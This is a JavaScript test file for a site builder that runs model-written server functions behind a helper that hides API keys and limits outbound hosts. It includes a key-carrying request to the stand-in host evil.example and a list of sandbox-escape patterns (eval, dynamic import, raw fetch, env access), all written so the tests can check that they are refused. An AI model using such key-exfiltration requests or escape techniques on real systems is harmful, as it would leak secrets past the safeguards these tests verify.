// THE SITE'S OWN SERVER CODE (2026-10-28): the model writes a `server-<name>`
// part; the site's Worker runs it at /api/db/<site>/fn/<name> through the
// `site` helper; the builder refuses code that reaches around the helper.
import test from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { loadTemplate } from "./fixtures/template-ts.mjs";
import { checkServerPart, vetServerCode, importsServer } from "../builder/server-code.mjs";

const KEY = "sk-live-owner-secret-123456";
const env = { OPENAI_KEY: KEY, APP_CONN: "" };
const url = (n) => new URL("https://kiln.gofarther.app/api/db/kiln/fn/" + n);
const req = (n, init) => new Request(url(n), { headers: { "CF-Connecting-IP": "1.2.3." + Math.random() }, ...init });

test("SF1 the key reaches the declared host and never the code", async () => {
  const { makeSite } = await loadTemplate("lib/site-functions.ts");
  const seen = [];
  const site = makeSite(env, "kiln", ["api.openai.com"], async (u, init) => { seen.push([u, init.headers.get("authorization")]); return new Response("{}"); });
  const stand = site.key("OPENAI_KEY");
  assert.ok(!stand.includes(KEY), "the code holds a stand-in, not the key");
  await site.fetch("https://api.openai.com/v1/chat", { method: "POST", headers: { authorization: "Bearer " + stand }, body: "{}" });
  assert.deepEqual(seen, [["https://api.openai.com/v1/chat", "Bearer " + KEY]]);
});

test("SF2 an undeclared host, http, a private address and a missing key are refused", async () => {
  const { makeSite } = await loadTemplate("lib/site-functions.ts");
  let called = 0;
  const site = makeSite(env, "kiln", ["api.openai.com"], async () => { called++; return new Response(""); });
  await assert.rejects(site.fetch("https://evil.example/x", { headers: { a: site.key("OPENAI_KEY") } }), /did not declare/);
  await assert.rejects(site.fetch("http://api.openai.com/x"), /refused/);
  await assert.rejects(site.fetch("https://api.openai.com/x", { headers: { a: site.key("NOT_SET") } }), /not set/);
  assert.equal(called, 0);
});

test("SF3 the call cap holds within one request", async () => {
  const { makeSite, CALLS_PER_REQUEST } = await loadTemplate("lib/site-functions.ts");
  const site = makeSite(env, "kiln", ["api.openai.com"], async () => new Response(""));
  for (let i = 0; i < CALLS_PER_REQUEST; i++) await site.fetch("https://api.openai.com/x");
  await assert.rejects(site.fetch("https://api.openai.com/x"), /too many/);
});

test("SF4 the route runs the module, marks it own, and withholds an answer carrying a key", async () => {
  const { siteFunction } = await loadTemplate("lib/site-functions.ts");
  const mods = {
    "/src/routes/-parts/server-ask.tsx": { hosts: [], default: async (r) => Response.json({ echo: new URL(r.url).pathname }) },
    "/src/routes/-parts/server-leak.tsx": { hosts: [], default: async () => new Response("here: " + KEY) },
    "/src/routes/-parts/server-boom.tsx": { hosts: [], default: async () => { throw new Error("bad " + KEY); } },
  };
  const ok = await siteFunction(req("ask"), env, url("ask"), "kiln", mods);
  assert.equal(ok.status, 200);
  assert.equal(ok.headers.get("x-site-data"), "own");
  const leak = await siteFunction(req("leak"), env, url("leak"), "kiln", mods);
  assert.equal(leak.status, 500);
  assert.ok(!(await leak.text()).includes(KEY));
  const boom = await siteFunction(req("boom"), env, url("boom"), "kiln", mods);
  assert.ok(!(await boom.text()).includes(KEY));
  assert.equal((await siteFunction(req("none"), env, url("none"), "kiln", mods)).status, 404);
  assert.equal(await siteFunction(req("ask"), env, new URL("https://x.gofarther.app/api/db/other/fn/ask"), "kiln", mods), null);
});

test("SF5 the checker passes the right shape and refuses each way around the helper", () => {
  const good = `export const hosts = ["api.openai.com"];
export default async function (request: Request, site: any) {
  const r = await site.fetch(\`https://api.openai.com/v1/x\`, { headers: { authorization: "Bearer " + site.key("OPENAI_KEY") } });
  return new Response(await r.text());
}`;
  assert.deepEqual(checkServerPart({ name: "server-ask", source: good }), { ok: true });
  const bad = (s) => checkServerPart({ name: "server-x", source: `export const hosts = [];\nexport default async function () { ${s}; return new Response("") }` });
  for (const s of ["const k = env.OPENAI_KEY", "fetch('https://x.com')", "eval('1')", "new Function('x')", "await import('x')", "globalThis.fetch", "new WebSocket('wss://x')", "site['fetch']('x')", "process.env.X", `const u = \`\${fetch("x")}\``]) {
    assert.equal(bad(s).ok, false, s);
  }
  assert.equal(checkServerPart({ name: "server-x", source: "export default async function(){ return new Response('') }" }).ok, false, "no hosts");
  assert.equal(checkServerPart({ name: "server-x", source: "import x from 'y';\nexport const hosts = [];\nexport default async function(){ return new Response('') }" }).ok, false, "an import");
  assert.equal(checkServerPart({ name: "server-x", source: "export const hosts = [];\n// fetch( in a comment\nexport default async function(){ return new Response('fetch(') }" }).ok, true, "prose is not code");
});

test("SF6 a failing server part is left out; a browser file importing server code is named", () => {
  const r = vetServerCode({
    pages: [{ path: "index.tsx", source: 'import ask from "@/routes/-parts/server-ask";' }],
    parts: [{ name: "band-a", source: "x" }, { name: "server-ask", source: "export default 1" }],
  });
  assert.deepEqual(r.parts.map((p) => p.name), ["band-a"]);
  assert.ok(r.problems.some((p) => p.includes("server-ask") && p.includes("left out")));
  assert.deepEqual(r.leaking, ["index.tsx"]);
  assert.equal(importsServer('import a from "./-parts/band-a"'), false);
});

test("SF7 wiring: the site's Worker routes functions; publish vets parts before the build", () => {
  const server = readFileSync(new URL("../builder/lovable/template/src/server.ts", import.meta.url), "utf8");
  assert.match(server, /await siteFunction\(request, env as unknown as FnEnv, url, SITE_SLUG\)/);
  const pub = readFileSync(new URL("../builder/publish-pages.mjs", import.meta.url), "utf8");
  const at = pub.indexOf("vetServerCode({ pages: v.pages, parts: v.parts })");
  assert.ok(at > 0 && at < pub.indexOf("deps.images(v.pages"), "vetted before photographs and the compile");
  assert.match(pub.slice(at, at + 300), /sitePartsForBuild = v\.parts/);
});
